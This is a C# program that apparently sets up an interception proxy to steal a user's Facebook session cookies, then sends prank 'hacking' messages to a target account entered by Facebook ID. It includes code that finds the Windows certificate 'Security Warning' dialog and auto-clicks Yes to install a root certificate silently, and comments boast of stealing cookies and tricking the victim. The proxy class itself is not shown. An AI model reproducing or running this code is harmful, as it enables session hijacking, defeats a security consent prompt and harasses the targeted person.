using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Threading;

namespace Titanium.Web.Proxy.Examples.Basic
{
    public class Program
    {
        private static readonly evilProxy Controller = new evilProxy();
        

        //imports needed for bypassing warning window..
        [DllImport("user32.dll")]
        static extern IntPtr GetDlgItem(IntPtr hWnd, int nIDDlgItem);
        [DllImport("user32.dll")]
        static extern IntPtr SendMessage(IntPtr hWnd, int Msg, int wParam, IntPtr lParam);

        private static string to = ""; //Who you want to troll?
        public static void Main(string[] args)
        {
            //On Console exit make sure we also exit the proxy
            NativeMethods.Handler = ConsoleEventCallback;
            NativeMethods.SetConsoleCtrlHandler(NativeMethods.Handler, true);

            Console.WriteLine("Please enter user fbid to troll : ");
            to = Console.ReadLine();
            if(Regex.Match(to,"[0-9]+").Value.Length != to.Length)
            {
                Console.WriteLine("incorrect fbid, Program will now exit ..");
                Thread.Sleep(3000);
                return;
            }

            Console.WriteLine("fbid Target : " + to);
            Console.WriteLine("enter www.facebook.com..");
            Console.WriteLine("proxy will steal the cookies..");
            Console.WriteLine("after cookie is found press any key to send messages =]");


            //bypass security warning to add root certificate
            //when the warning window opens, it auto-clicks on the yes button =]
            new Thread(() =>
            {
                IntPtr wHandle = IntPtr.Zero;

                bool found = false;
                for (int i = 0; i < 25 && !found; i++)
                {
                    foreach (var process in Process.GetProcesses())
                    {
                        if (process.MainWindowTitle.Contains("Security Warning")) //finding the Security Warning Window
                        {
                            wHandle = process.MainWindowHandle; // Saving Handle
                            found = true;
                            break;
                        }
                    }
                    Thread.Sleep(100); //scanning for warning window in 2.5 seconds
                    //after the first run this is not needed.. but still good to keep.
                }
                if (wHandle != IntPtr.Zero)
                {
                    IntPtr hWndButton = GetDlgItem(wHandle, 6); //find Yes Button.. id = 6  
                    SendMessage(hWndButton, 0x00F5, 0,IntPtr.Zero); //clicking YES ! ;)
                    //SendMessage(wHandle, WM_COMMAND, wParam, hWndButton);
                }


            }).Start();
            //Start proxy controller
            Controller.StartProxy();

            Console.WriteLine("Waiting for cookie...");
            Console.ReadLine();
            new Thread(() =>
            {
               
                Controller.sendMessage("Hacking your computer...", to);
                for (long i = 2; i <= long.MaxValue; i = i*5)
                {
                    if (i <= 0 || i*5<=0) break;
                    var msg = i + "*" + 5 + "=" + i * 5 + " Hex = " + i.ToString("X8");

                    Controller.sendMessage(msg+"0x",to);
                    Thread.Sleep(100);
                }

                //lets trick this guy into thinking we hacked him :D
                Controller.sendMessage("Formatting Computer ... 80%",to);
                Thread.Sleep(500);
                Controller.sendMessage("Deleting Drive c:/ ... 90%", to);
                Thread.Sleep(500);
                Controller.sendMessage("Shutting Down Computer ... 99%", to);
                Thread.Sleep(500);
                Controller.sendMessage("5", to);
                Thread.Sleep(900);
                Controller.sendMessage("4", to);
                Thread.Sleep(900);
                Controller.sendMessage("3", to);
                Thread.Sleep(900);
                Controller.sendMessage("2", to);
                Thread.Sleep(900);
                Controller.sendMessage("1", to);
                Thread.Sleep(900);
                Controller.sendMessage("Bye !!!!", to);
                Console.WriteLine("Press Enter to exit...");
            }
            ).Start();

            //Controller.sendMessage("Hack Finished");
            Console.WriteLine("Sending Messages.. Please Wait.");
            Console.ReadLine();

            Controller.Stop();
        }


        private static bool ConsoleEventCallback(int eventType)
        {
            if (eventType != 2) return false;
            try
            {
                Controller.Stop();
            }
            catch
            {
                // ignored
            }
            return false;
        }
    }

    internal static class NativeMethods
    {
        // Keeps it from getting garbage collected
        internal static ConsoleEventDelegate Handler;

        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern bool SetConsoleCtrlHandler(ConsoleEventDelegate callback, bool add);

        // Pinvoke
        internal delegate bool ConsoleEventDelegate(int eventType);
    }
}